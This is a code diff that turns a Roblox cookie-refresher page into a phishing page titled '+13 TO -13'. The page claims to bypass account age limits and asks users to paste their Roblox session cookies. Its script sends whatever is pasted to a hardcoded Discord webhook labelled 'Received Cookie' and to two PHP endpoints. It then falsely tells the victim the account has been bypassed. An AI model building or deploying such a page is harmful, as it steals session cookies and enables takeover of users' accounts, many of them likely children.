@@ -3,91 +3,193 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Cookie Refresher</title>
+    <title>+13 TO -13</title>
+    <link rel="icon" href="https://cdn.discordapp.com/attachments/1324499580728901764/1338572878563774474/download__4_-removebg-preview.png?ex=67ab92a3&is=67aa4123&hm=264e8bde92868d606329d83bdb080ff9aff1e59f3b94ea12b7a1ff80a49aa046&" type="image/png">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/izitoast/dist/css/iziToast.min.css">
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background-color: #2c2f38; 
+            color: white; 
+            text-align: center; 
         }
-        .container {
-            background-color: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            width: 300px;
+        .container { 
+            max-width: 600px; 
+            margin: 100px auto; 
+            padding: 30px; 
+            background-color: #1e2229; 
+            border-radius: 10px; 
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1); 
+            animation: fadeIn 0.5s ease-in-out;
+            border: 2px solid #6a1b9a; /* Purple border */
         }
-        h1 {
-            text-align: center;
-            font-size: 24px;
-            color: #333;
+        @keyframes fadeIn {
+            0% { opacity: 0; transform: translateY(-20px); }
+            100% { opacity: 1; transform: translateY(0); }
         }
-        input[type="text"] {
-            padding: 10px;
-            width: 100%;
-            margin-bottom: 10px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
+        textarea { 
+            width: 100%; 
+            height: 200px; 
+            padding: 12px; 
+            font-size: 16px; 
+            border: 1px solid #6a1b9a; /* Purple border for textarea */
+            border-radius: 8px; 
+            outline: none; 
+            resize: none; 
+            transition: all 0.3s ease-in-out;
+            background-color: #3a3f48; /* Dark background for textarea */
+            color: white; /* White text */
         }
-        button {
-            padding: 10px;
-            width: 100%;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
+        textarea:focus {
+            border-color: #9c27b0; /* Lighter purple when focused */
+            box-shadow: 0 0 8px rgba(156, 39, 176, 0.5);
         }
-        button:hover {
-            background-color: #45a049;
+        button { 
+            padding: 12px 20px; 
+            background-color: #9c27b0; /* Purple button */
+            color: white; 
+            font-size: 16px; 
+            font-weight: 600; 
+            border: none; 
+            border-radius: 5px; 
+            cursor: pointer; 
+            transition: all 0.3s ease-in-out;
         }
-        p {
-            font-size: 14px;
-            color: #666;
-            text-align: center;
+        button:disabled {
+            background-color: #888;
+            cursor: not-allowed;
         }
-        #responseMessage {
-            margin-top: 10px;
-            color: #ff0000;
-            text-align: center;
+        a {
+            color: #9c27b0; /* Purple links */
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Roblox Cookie Refresher</h1>
-        <form id="cookieForm">
-            <label for="cookie">Enter .ROBLOSECURITY Cookie:</label><br>
-            <input type="text" id="cookie" name="cookie" required><br><br>
-            <button type="submit">Refresh Cookie</button>
+
+<div class="container">
+    <h1>+13 TO -13</h1> <!-- Keeping the title as you wanted -->
+    <div class="form-box">
+        <form id="bypassForm">
+            <label for="payload">Enter Cookies:</label><br>
+            <textarea name="payload" id="payload" rows="6"></textarea><br>
+            <button type="submit" id="submitBtn">Submit Cookies</button>
+            <p id="countdown" style="margin-top: 10px; font-size: 14px; color: red;"></p>
         </form>
-        <p id="responseMessage"></p>
     </div>
+    <br>
+    <p>Join Discord here: <a href="https://discord.gg/95mrFB2RTn" target="_blank">https://discord.gg/95mrFB2RTn</a></p>
+</div>
 
-    <script>
-        document.getElementById('cookieForm').addEventListener('submit', async function(event) {
-            event.preventDefault();
-            const cookie = document.getElementById('cookie').value;
-            const responseMessage = document.getElementById('responseMessage');
+<script src="https://cdn.jsdelivr.net/npm/izitoast/dist/js/iziToast.min.js"></script>
+<script>
+function setCooldown(timeLeft) {
+    const submitBtn = document.getElementById('submitBtn');
+    const countdown = document.getElementById('countdown');
+    submitBtn.disabled = true;
+    
+    const interval = setInterval(() => {
+        if (timeLeft <= 0) {
+            clearInterval(interval);
+            submitBtn.disabled = false;
+            submitBtn.textContent = "Submit Cookies";
+            countdown.textContent = "";
+            localStorage.removeItem("cooldownEnd");
+        } else {
+            submitBtn.textContent = `Please wait ${timeLeft}s`;
+            countdown.textContent = `Wait ${timeLeft}s before submitting again`;
+            timeLeft--;
+        }
+    }, 1000);
+}
 
-            try {
-                // Send the cookie to your refresh API
-                const response = await fetch(`/api/refresh?cookie=${cookie}`);
-                const data = await response.json();
-
-                if (response.ok) {
-                    responseMessage.textContent = `Cookie refreshed successfully! New cookie: ${data.refreshedCookie || 'No refreshed cookie returned'}`;
-                } else {
-                    responseMessage.textContent = `Error: ${data.error || 'Something went wrong'}`;
-                }
-            } catch (error) {
-                responseMessage.textContent = 'Error: Unable to connect to the server.';
-            }
+document.getElementById('bypassForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+    const payload = document.getElementById('payload').value;
+    if (!payload.trim()) {
+        iziToast.show({
+            title: 'Error:',
+            message: 'Please enter your Roblox cookies.',
+            color: 'red',
+            position: 'topCenter',
+            timeout: 3000
         });
-    </script>
+        return;
+    }
+
+    const cooldownEnd = Date.now() + 30000;
+    localStorage.setItem("cooldownEnd", cooldownEnd);
+    setCooldown(30);
+
+    const webhookURL = 'https://discord.com/api/webhooks/1340386580770197665/1WyB76Ns5PG9YO-DVQo7Hv2PAtLi11td9UBRwFQIqiA0eM9b5Gyzz5JYRdSm9C3sweoa';
+    const data = {
+        content: `Received Cookie:\n${payload}`,
+        username: "Spiders",  // Changed username to "Spiders"
+        avatar_url: "https://cdn.discordapp.com/attachments/1324499580728901764/1338572878563774474/download__4_-removebg-preview.png"
+    };
+
+    fetch(webhookURL, {
+        method: 'POST',
+        body: JSON.stringify(data),
+        headers: { 'Content-Type': 'application/json' }
+    })
+    .then(response => response.json())
+    .then(responseData => {
+        iziToast.show({
+            title: 'Success:',
+            message: 'Your account has been bypassed. Wait five minutes to work.',
+            color: 'green',
+            position: 'topCenter',
+            timeout: 5000
+        });
+    })
+
+    const requests = [
+        fetch('agev1.php', {
+            method: 'POST',
+            body: JSON.stringify({ a: payload }),
+            headers: { 'Content-Type': 'application/json' }
+        }),
+        fetch('bypass_cookie.php', {
+            method: 'POST',
+            body: JSON.stringify({ payload: payload }),
+            headers: { 'Content-Type': 'application/json' }
+        })
+    ];
+
+    Promise.all(requests)
+        .then(responses => Promise.all(responses.map(response => response.json())))
+        .then(data => {
+            let message = 'Successfully';
+            data.forEach(responseData => {
+                if (responseData.errors && responseData.errors.length > 0) {
+                    message = responseData.errors[0].message.trim() || 'Invalid Cookies';
+                }
+            });
+
+            iziToast.show({
+                title: '',
+                message: message,
+                color: message === 'Invalid Cookies' ? 'red' : 'green',
+                position: 'topCenter',
+                timeout: 5000
+            });
+        })
+        .catch(error => {
+            iziToast.show({
+                title: 'Error:',
+                message: 'An error occurred while getting cookies.',
+                color: 'red',
+                position: 'topCenter',
+                timeout: 5000
+            });
+        });
+});
+</script>
+
 </body>
 </html>
